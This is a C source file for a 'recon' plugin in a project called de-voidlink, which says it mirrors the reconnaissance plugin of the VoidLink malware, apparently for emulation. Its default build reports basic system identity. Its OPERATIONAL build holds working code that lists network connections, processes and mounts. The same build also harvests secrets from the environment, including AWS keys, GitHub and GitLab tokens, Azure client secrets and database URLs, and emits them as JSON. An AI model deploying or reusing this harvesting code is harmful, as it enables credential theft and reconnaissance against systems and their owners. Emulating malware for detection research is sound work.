/*
 * de-voidlink Arsenal Plugin: recon
 *
 * Mirrors VoidLink's reconnaissance plugin behavior.
 *
 * BENIGN (default): hostname, kernel, arch, UID/GID via uname.
 * OPERATIONAL (-DOPERATIONAL): Full system enumeration — network connections,
 *   processes, mounts, environment secrets, OS identification.
 *
 * All I/O via direct syscalls through the SyscallTable dispatch.
 * No libc. Freestanding.
 */

#include "plugin_api.h"

/* Syscall numbers (x86_64) */
#define SYS_uname       63
#define SYS_getuid      102
#define SYS_getgid      104
#define SYS_openat      257
#define SYS_read        0
#define SYS_close       3
#define SYS_getdents64  217

#define VL_AT_FDCWD     (-100)
#define O_RDONLY        0

/* utsname struct layout matching kernel ABI */
struct utsname {
    char sysname[65];
    char nodename[65];
    char release[65];
    char version[65];
    char machine[65];
    char domainname[65];
};

static PluginInfo info = {
    .name = "recon",
#ifdef OPERATIONAL
    .version = "2.0.0",
    .description = "Full system reconnaissance — network, processes, mounts, env, OS ID",
#else
    .version = "1.0.0",
    .description = "System reconnaissance — hostname, kernel, arch, cloud hints",
#endif
    .author = "de-voidlink",
    .api_version = PLUGIN_API_VERSION,
    .capabilities = PLUGIN_CAP_FILESYSTEM,
};

PluginInfo* plugin_info(void) {
    return &info;
}

int plugin_init(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}

/* Helper: format integer to decimal string, return length */
static int fmt_uint(char *buf, unsigned long val) {
    char tmp[20];
    int i = 0;
    if (val == 0) {
        buf[0] = '0';
        return 1;
    }
    while (val > 0) {
        tmp[i++] = '0' + (char)(val % 10);
        val /= 10;
    }
    for (int j = 0; j < i; j++) {
        buf[j] = tmp[i - 1 - j];
    }
    return i;
}

#ifdef OPERATIONAL
/* Helper: manual string length */
static size_t vl_strlen(const char *s) {
    size_t len = 0;
    while (s[len]) len++;
    return len;
}


/* Helper: read file contents into buffer via syscalls, return bytes read */
static long read_file(PluginContext *ctx, const char *path, char *buf, size_t bufsize) {
    if (!ctx->syscalls) return -1;
    long fd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD, (long)path, O_RDONLY, 0);
    if (fd < 0) return -1;
    long total = 0;
    while ((size_t)total < bufsize - 1) {
        long n = ctx->syscalls->syscall3(SYS_read, fd, (long)(buf + total), (long)(bufsize - 1 - (size_t)total));
        if (n <= 0) break;
        total += n;
    }
    buf[total] = 0;
    ctx->syscalls->syscall1(SYS_close, fd);
    return total;
}

/* Helper: output a JSON-safe string (escape quotes and backslashes) */
static void output_json_str(PluginContext *ctx, const char *s, size_t len) {
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (c == '"' || c == '\\') {
            OUTPUT_WRITE(ctx, "\\", 1);
        }
        if (c == '\n') {
            OUTPUT_WRITE(ctx, "\\n", 2);
        } else if (c == '\r') {
            OUTPUT_WRITE(ctx, "\\r", 2);
        } else if (c == '\t') {
            OUTPUT_WRITE(ctx, "\\t", 2);
        } else if (c >= 32 && c < 127) {
            OUTPUT_WRITE(ctx, &c, 1);
        }
    }
}

/* Helper: parse hex IP + port from /proc/net/tcp format (e.g., "0100007F:1F90") */
static void output_hex_addr(PluginContext *ctx, const char *hex) {
    /* Format: AABBCCDD:PORT where AABBCCDD is little-endian IP, PORT is big-endian hex port */
    unsigned char ip[4] = {0};
    unsigned int port_val = 0;
    int colon = -1;

    /* Find colon */
    for (int i = 0; hex[i]; i++) {
        if (hex[i] == ':') { colon = i; break; }
    }
    if (colon != 8) return; /* Expected 8 hex chars for IP */

    /* Parse hex IP (little-endian in /proc/net/tcp) */
    for (int i = 0; i < 4; i++) {
        unsigned char hi = (unsigned char)hex[i*2];
        unsigned char lo = (unsigned char)hex[i*2+1];
        hi = (hi >= 'A') ? (hi - 'A' + 10) : (hi >= 'a') ? (hi - 'a' + 10) : (hi - '0');
        lo = (lo >= 'A') ? (lo - 'A' + 10) : (lo >= 'a') ? (lo - 'a' + 10) : (lo - '0');
        ip[i] = (unsigned char)(hi * 16 + lo);
    }

    /* Parse hex port */
    for (int i = colon + 1; hex[i] && hex[i] != ' ' && hex[i] != '\n'; i++) {
        unsigned char c = (unsigned char)hex[i];
        unsigned char v = (c >= 'A') ? (c - 'A' + 10) : (c >= 'a') ? (c - 'a' + 10) : (c - '0');
        port_val = port_val * 16 + v;
    }

    /* Output as dotted-quad:port — note /proc uses little-endian IP so reverse octets */
    char out[32];
    int pos = 0;
    pos += fmt_uint(out + pos, ip[3]); out[pos++] = '.';
    pos += fmt_uint(out + pos, ip[2]); out[pos++] = '.';
    pos += fmt_uint(out + pos, ip[1]); out[pos++] = '.';
    pos += fmt_uint(out + pos, ip[0]); out[pos++] = ':';
    pos += fmt_uint(out + pos, port_val);
    OUTPUT_WRITE(ctx, out, (size_t)pos);
}

/* Emit /proc/net/tcp connections as JSON array */
static void emit_network_connections(PluginContext *ctx) {
    char buf[8192];
    long n = read_file(ctx, "/proc/net/tcp", buf, sizeof(buf));
    if (n <= 0) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }

    OUTPUT_STRING(ctx, "[");
    int count = 0;
    int line = 0;
    char *p = buf;

    while (*p) {
        /* Find end of line */
        char *eol = p;
        while (*eol && *eol != '\n') eol++;

        if (line > 0) { /* Skip header line */
            /* Fields: sl local_address rem_address st ... */
            /* Skip leading whitespace and sl field */
            char *f = p;
            while (*f == ' ') f++;
            /* Skip sl: */
            while (*f && *f != ' ') f++;
            while (*f == ' ') f++;
            /* f now points at local_address */
            char *local = f;
            while (*f && *f != ' ') f++;
            while (*f == ' ') f++;
            /* f now points at rem_address */
            char *remote = f;
            while (*f && *f != ' ') f++;
            while (*f == ' ') f++;
            /* f now points at state */
            char *state = f;

            if (count > 0) OUTPUT_STRING(ctx, ",");
            OUTPUT_STRING(ctx, "{\"local\":\"");
            output_hex_addr(ctx, local);
            OUTPUT_STRING(ctx, "\",\"remote\":\"");
            output_hex_addr(ctx, remote);
            OUTPUT_STRING(ctx, "\",\"state\":\"");
            /* State is a 2-digit hex number */
            OUTPUT_WRITE(ctx, state, 2);
            OUTPUT_STRING(ctx, "\"}");
            count++;
        }
        line++;
        if (*eol == '\n') p = eol + 1; else break;
    }
    OUTPUT_STRING(ctx, "]");
}

/* Emit /proc/mounts as JSON array */
static void emit_mounts(PluginContext *ctx) {
    char buf[4096];
    long n = read_file(ctx, "/proc/mounts", buf, sizeof(buf));
    if (n <= 0) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }
    OUTPUT_STRING(ctx, "[");
    int count = 0;
    char *p = buf;
    while (*p) {
        char *eol = p;
        while (*eol && *eol != '\n') eol++;
        size_t linelen = (size_t)(eol - p);

        if (linelen > 0) {
            /* Fields: device mountpoint fstype options ... */
            char *device = p;
            char *f = p;
            while (*f && *f != ' ') f++;
            size_t devlen = (size_t)(f - device);
            while (*f == ' ') f++;
            char *mountpoint = f;
            while (*f && *f != ' ') f++;
            size_t mplen = (size_t)(f - mountpoint);
            while (*f == ' ') f++;
            char *fstype = f;
            while (*f && *f != ' ') f++;
            size_t ftlen = (size_t)(f - fstype);

            if (count > 0) OUTPUT_STRING(ctx, ",");
            OUTPUT_STRING(ctx, "{\"dev\":\"");
            output_json_str(ctx, device, devlen);
            OUTPUT_STRING(ctx, "\",\"mount\":\"");
            output_json_str(ctx, mountpoint, mplen);
            OUTPUT_STRING(ctx, "\",\"fs\":\"");
            output_json_str(ctx, fstype, ftlen);
            OUTPUT_STRING(ctx, "\"}");
            count++;
        }
        if (*eol == '\n') p = eol + 1; else break;
    }
    OUTPUT_STRING(ctx, "]");
}

/* Emit environment secrets from /proc/self/environ */
static void emit_env_secrets(PluginContext *ctx) {
    static const char *targets[] = {
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "KUBECONFIG", "DOCKER_HOST", "SSH_AUTH_SOCK",
        "GCP_SERVICE_ACCOUNT", "AZURE_CLIENT_SECRET",
        "GITHUB_TOKEN", "GITLAB_TOKEN", "DATABASE_URL",
        "PATH", "HOME", "USER", "SHELL"
    };
    #define NUM_ENV_TARGETS (sizeof(targets) / sizeof(targets[0]))

    char buf[8192];
    long n = read_file(ctx, "/proc/self/environ", buf, sizeof(buf));

    OUTPUT_STRING(ctx, "{");
    int found = 0;

    if (n > 0) {
        /* environ entries are \0-separated */
        char *p = buf;
        char *end = buf + n;
        while (p < end) {
            size_t elen = vl_strlen(p);
            if (elen == 0) { p++; continue; }

            /* Check if this var matches any target */
            for (unsigned int t = 0; t < NUM_ENV_TARGETS; t++) {
                size_t tlen = vl_strlen(targets[t]);
                int match = 1;
                if (elen <= tlen + 1) { match = 0; }
                else {
                    for (size_t k = 0; k < tlen; k++) {
                        if (p[k] != targets[t][k]) { match = 0; break; }
                    }
                    if (match && p[tlen] != '=') match = 0;
                }
                if (match) {
                    if (found > 0) OUTPUT_STRING(ctx, ",");
                    OUTPUT_STRING(ctx, "\"");
                    OUTPUT_WRITE(ctx, targets[t], tlen);
                    OUTPUT_STRING(ctx, "\":\"");
                    char *val = p + tlen + 1;
                    size_t vlen = elen - tlen - 1;
                    output_json_str(ctx, val, vlen);
                    OUTPUT_STRING(ctx, "\"");
                    found++;
                    break;
                }
            }
            p += elen + 1;
        }
    }
    OUTPUT_STRING(ctx, "}");
}

/* Emit /etc/os-release info */
static void emit_os_release(PluginContext *ctx) {
    char buf[2048];
    long n = read_file(ctx, "/etc/os-release", buf, sizeof(buf));
    if (n <= 0) {
        OUTPUT_STRING(ctx, "\"unknown\"");
        return;
    }
    /* Find PRETTY_NAME="..." or NAME="..." */
    char *p = buf;
    while (*p) {
        char *eol = p;
        while (*eol && *eol != '\n') eol++;

        int is_name = 0;
        char *val_start = 0;
        size_t val_len = 0;

        /* Check for PRETTY_NAME= */
        if (eol - p > 12 && p[0] == 'P' && p[1] == 'R' && p[2] == 'E' && p[3] == 'T' &&
            p[4] == 'T' && p[5] == 'Y' && p[6] == '_' && p[7] == 'N' && p[8] == 'A' &&
            p[9] == 'M' && p[10] == 'E' && p[11] == '=') {
            is_name = 1;
            val_start = p + 12;
            val_len = (size_t)(eol - val_start);
        }

        if (is_name && val_start) {
            /* Strip quotes */
            if (val_len > 1 && val_start[0] == '"') {
                val_start++;
                val_len -= 2;
            }
            OUTPUT_STRING(ctx, "\"");
            output_json_str(ctx, val_start, val_len);
            OUTPUT_STRING(ctx, "\"");
            return;
        }
        if (*eol == '\n') p = eol + 1; else break;
    }
    OUTPUT_STRING(ctx, "\"unknown\"");
}

/* getdents64 entry */
struct linux_dirent64 {
    uint64_t d_ino;
    int64_t  d_off;
    uint16_t d_reclen;
    uint8_t  d_type;
    char     d_name[];
};

/* Emit running processes from /proc */
static void emit_processes(PluginContext *ctx) {
    if (!ctx->syscalls) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }

    long dirfd = ctx->syscalls->syscall4(SYS_openat, (long)VL_AT_FDCWD, (long)"/proc", O_RDONLY, 0);
    if (dirfd < 0) {
        OUTPUT_STRING(ctx, "[]");
        return;
    }

    OUTPUT_STRING(ctx, "[");
    char dents_buf[4096];
    int count = 0;

    for (;;) {
        long nread = ctx->syscalls->syscall3(SYS_getdents64, dirfd, (long)dents_buf, sizeof(dents_buf));
        if (nread <= 0) break;

        long pos = 0;
        while (pos < nread) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(dents_buf + pos);

            /* Check if name is all digits (PID directory) */
            int is_pid = 1;
            unsigned long pid = 0;
            for (int k = 0; d->d_name[k]; k++) {
                if (d->d_name[k] < '0' || d->d_name[k] > '9') { is_pid = 0; break; }
                pid = pid * 10 + (unsigned long)(d->d_name[k] - '0');
            }

            if (is_pid && pid > 0 && count < 100) {
                /* Read /proc/<pid>/comm */
                char comm_path[64];
                int cp = 0;
                const char *prefix = "/proc/";
                for (int k = 0; prefix[k]; k++) comm_path[cp++] = prefix[k];
                char pidbuf[20];
                int pidlen = fmt_uint(pidbuf, pid);
                for (int k = 0; k < pidlen; k++) comm_path[cp++] = pidbuf[k];
                const char *suffix = "/comm";
                for (int k = 0; suffix[k]; k++) comm_path[cp++] = suffix[k];
                comm_path[cp] = 0;

                char comm[256];
                long cn = read_file(ctx, comm_path, comm, sizeof(comm));

                if (cn > 0) {
                    /* Strip trailing newline */
                    if (cn > 0 && comm[cn-1] == '\n') comm[--cn] = 0;

                    if (count > 0) OUTPUT_STRING(ctx, ",");
                    OUTPUT_STRING(ctx, "{\"pid\":");
                    char pbuf[20];
                    int plen = fmt_uint(pbuf, pid);
                    OUTPUT_WRITE(ctx, pbuf, (size_t)plen);
                    OUTPUT_STRING(ctx, ",\"name\":\"");
                    output_json_str(ctx, comm, (size_t)cn);
                    OUTPUT_STRING(ctx, "\"}");
                    count++;
                }
            }
            pos += d->d_reclen;
        }
    }

    ctx->syscalls->syscall1(SYS_close, dirfd);
    OUTPUT_STRING(ctx, "]");
}

#endif /* OPERATIONAL */

int plugin_exec(PluginContext *ctx) {
    if (ctx->mode == EXEC_MODE_DRY_RUN) {
        OUTPUT_STRING(ctx, "{\"plugin\":\"recon\",\"mode\":\"dry_run\",\"status\":\"skipped\"}\n");
        return PLUGIN_DRY_RUN;
    }

    /* Collect uname info via direct syscall or dispatch table */
    struct utsname uts;
    long rc = -1;

    /* Zero out struct */
    for (unsigned long i = 0; i < sizeof(uts); i++) {
        ((char *)&uts)[i] = 0;
    }

    if (ctx->syscalls) {
        rc = ctx->syscalls->syscall1(SYS_uname, (long)&uts);
    }

    /* Format output as JSON */
    OUTPUT_STRING(ctx, "{\"plugin\":\"recon\",\"data\":{");

    /* Hostname */
    OUTPUT_STRING(ctx, "\"hostname\":\"");
    if (rc == 0) { OUTPUT_STRING(ctx, uts.nodename); } else { OUTPUT_STRING(ctx, "unknown"); }
    OUTPUT_STRING(ctx, "\",");

    /* Kernel */
    OUTPUT_STRING(ctx, "\"kernel\":\"");
    if (rc == 0) { OUTPUT_STRING(ctx, uts.release); } else { OUTPUT_STRING(ctx, "unknown"); }
    OUTPUT_STRING(ctx, "\",");

    /* Architecture */
    OUTPUT_STRING(ctx, "\"arch\":\"");
    if (rc == 0) { OUTPUT_STRING(ctx, uts.machine); } else { OUTPUT_STRING(ctx, "unknown"); }
    OUTPUT_STRING(ctx, "\",");

    /* OS */
    OUTPUT_STRING(ctx, "\"os\":\"");
    if (rc == 0) { OUTPUT_STRING(ctx, uts.sysname); } else { OUTPUT_STRING(ctx, "unknown"); }
    OUTPUT_STRING(ctx, "\",");

    /* UID */
    OUTPUT_STRING(ctx, "\"uid\":");
    if (ctx->syscalls) {
        long uid = ctx->syscalls->syscall0(SYS_getuid);
        char uid_buf[20];
        int len = fmt_uint(uid_buf, (unsigned long)uid);
        OUTPUT_WRITE(ctx, uid_buf, (size_t)len);
    } else {
        OUTPUT_STRING(ctx, "-1");
    }
    OUTPUT_STRING(ctx, ",");

    /* GID */
    OUTPUT_STRING(ctx, "\"gid\":");
    if (ctx->syscalls) {
        long gid = ctx->syscalls->syscall0(SYS_getgid);
        char gid_buf[20];
        int len = fmt_uint(gid_buf, (unsigned long)gid);
        OUTPUT_WRITE(ctx, gid_buf, (size_t)len);
    } else {
        OUTPUT_STRING(ctx, "-1");
    }

#ifdef OPERATIONAL
    OUTPUT_STRING(ctx, ",");

    /* OS Release (PRETTY_NAME) */
    OUTPUT_STRING(ctx, "\"os_release\":");
    emit_os_release(ctx);
    OUTPUT_STRING(ctx, ",");

    /* Network connections */
    OUTPUT_STRING(ctx, "\"network\":{\"tcp\":");
    emit_network_connections(ctx);
    OUTPUT_STRING(ctx, "},");

    /* Mounts */
    OUTPUT_STRING(ctx, "\"mounts\":");
    emit_mounts(ctx);
    OUTPUT_STRING(ctx, ",");

    /* Processes */
    OUTPUT_STRING(ctx, "\"processes\":");
    emit_processes(ctx);
    OUTPUT_STRING(ctx, ",");

    /* Environment secrets */
    OUTPUT_STRING(ctx, "\"env\":");
    emit_env_secrets(ctx);
#endif

    OUTPUT_STRING(ctx, "}}\n");
    return PLUGIN_OK;
}

int plugin_cleanup(PluginContext *ctx) {
    (void)ctx;
    return PLUGIN_OK;
}
